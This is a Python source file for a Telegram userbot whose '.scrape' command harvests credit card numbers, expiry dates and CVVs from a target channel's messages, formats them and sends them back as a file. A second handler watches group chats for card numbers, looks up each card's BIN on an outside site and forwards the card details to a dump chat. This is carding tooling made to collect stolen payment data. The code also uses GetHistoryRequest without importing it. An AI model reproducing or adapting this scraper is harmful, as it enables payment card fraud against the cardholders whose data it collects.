import re
import asyncio
import os
import io

from telethon import events, types, errors
from ..func import http
from bs4 import BeautifulSoup as bs
from ubb import Ubot, DUMP_ID


@Ubot.on(events.NewMessage(pattern=r'\.scrape'))
async def scrapper(event):
    # use .scrape {channel_id} 100
    # default limit 100 u can scrape below 100 at a time
    target, limit = event.message.message[len('.scrape '):].split()
    posts = await Ubot(
        GetHistoryRequest(
            peer=target, 
            limit=int(limit), 
            offset_date=None, 
            offset_id=0, 
            max_id=0, 
            min_id=0,
            add_offset=0,
            hash=0)
    )
    cards = re.findall(r"message='([^']+)", posts.stringify())
    RAWCC = []
    for cc in cards:
        try:
            x = re.findall('[0-9]+', cc)
            cn = x[0]
            mm = x[1]
            yy = x[2]
            cvv = x[3]
            if str(mm).startswith('2'):
                mm, yy = yy, mm
            if len(mm) >= 3: 
                mm, yy, cvv = yy, cvv, mm
            value = f'{cn}|{mm}|{yy}|{cvv}\n'
            regex = re.compile(r'((?:(^(4|5|6)[0-9]{15,15})|(^3[0-9]{14,14}))\|[0-9]{1,2}\|[0-9]{2,4}\|[0-9]{3,4})')
            if regex.match(value):
                RAWCC.append(value)  # append valid format ccs!
        except IndexError:
            pass
        
    CLEAN = set(RAWCC) # rm duplicates from list
    for CC in CLEAN:
        with io.open('Scrapped.txt', 'a') as f:
            f.write(f'{CC}')
    await Ubot.send_file(event.peer_id,
                         'Scrapped.txt', 
                         caption=f'**CC Scrapper\nNo. of cards from {target}: {len(CLEAN)}\nUserBotBy-» @Xbinner2**',
                         force_document=True)
    os.remove('Scrapped.txt') # rm old file to prevent duplicates
    
    
@Ubot.on(events.NewMessage())  # pylint:disable=E0602
async def check_incoming_messages(event):
    me = await Ubot.get_me()
    if event.sender_id == me.id:
        return
    entities = event.message.entities
    prefixes = ['?', '/', '.', '!']
    m = event.message.message
    if m.startswith(tuple(prefixes)) or len(m) < 25 or event.is_private or len(m) > 600:
        return
    is_cc = False
    if entities:
        for entity in entities:
            if isinstance(entity, types.MessageEntityBankCard):
                is_cc = True
            if is_cc:
                try:
                    x = re.findall(r'\d+', m)
                    if len(x) > 10:
                        return
                    BIN = re.search(r'\d{15,16}', m)[0][:6]
                    r = await http.get(f'https://bins.ws/search?bins={BIN}')
                    soup = bs(r, features='html.parser')
                    k = soup.find("div", {"class": "page"})
                    MSG = f"""
{m}

{k.get_text()[62:]}
"""
                    await asyncio.sleep(3)
                    await Ubot.send_message(DUMP_ID, MSG)
                except errors.FloodWaitError as e:
                    print(f'flood wait: {e.seconds}')
                    await asyncio.sleep(e.seconds)
                    await Ubot.send_message(DUMP_ID, MSG)
